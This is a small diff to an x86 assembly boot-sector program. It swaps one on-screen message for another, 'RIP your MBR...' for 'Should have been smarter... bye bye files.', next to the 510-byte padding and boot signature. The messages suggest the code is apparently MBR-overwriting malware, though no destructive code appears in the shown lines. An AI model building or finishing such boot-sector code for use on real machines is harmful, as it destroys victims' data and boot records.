@@ -22,7 +22,7 @@ print:
     popa
 
 
-msg db "RIP your MBR...", 0
+msg db "Should have been smarter... bye bye files.", 0
 
 times 510 - ($ - $$) db 0
 dw 0xaa55
